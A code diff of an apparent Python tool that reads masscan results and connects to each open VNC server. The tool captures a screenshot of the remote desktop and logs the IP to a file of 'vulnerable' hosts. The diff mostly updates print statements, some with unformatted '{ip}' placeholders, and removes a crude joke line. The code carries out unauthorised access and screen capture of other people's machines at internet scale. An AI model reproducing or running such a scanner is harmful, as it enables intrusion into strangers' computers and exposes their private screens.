@@ -10,18 +10,19 @@ from filelock import FileLock
 def parseLine(line,number):
     parsedLine = line.split(" ")
     if parsedLine[0] == "open" and not os.path.isfile('screenshot_IP_{ip}.png'.format(ip=parsedLine[3])):
-    #print "open at {ip}".format(ip=parsedLine[3])
+        #print("open at {ip}".format(ip=parsedLine[3]))
         try:
+            #print("trying to connect to {ip}")
             client = api.connect('{ip}:0'.format(ip=parsedLine[3]))
-            #print "connected"
+            print("connected to {ip}")
             client.captureScreen('screenshot_IP_{ip}.png'.format(ip=parsedLine[3]))
-            print("screenshot taken")
+            print("screenshot taken of {ip}")
             with FileLock("vulnerableIPs.txt"):
                 with open('vulnerableIPs.txt', 'a') as file:
                     file.write(parsedLine[3])
         except:
             pass
-            #print 'Cant get image from {ip}'.format(ip=parsedLine[3])
+            #print('Cant get image from {ip}'.format(ip=parsedLine[3]))
 
 def getIPs():
     masscanCommand = "masscan"
@@ -40,7 +41,6 @@ def main():
     x = input()
 
     if(x != '2'):
-        print("you have chosen penis sex")
         ipgetter = threading.Thread(target=getIPs,args=())
         ipgetter.start()
 
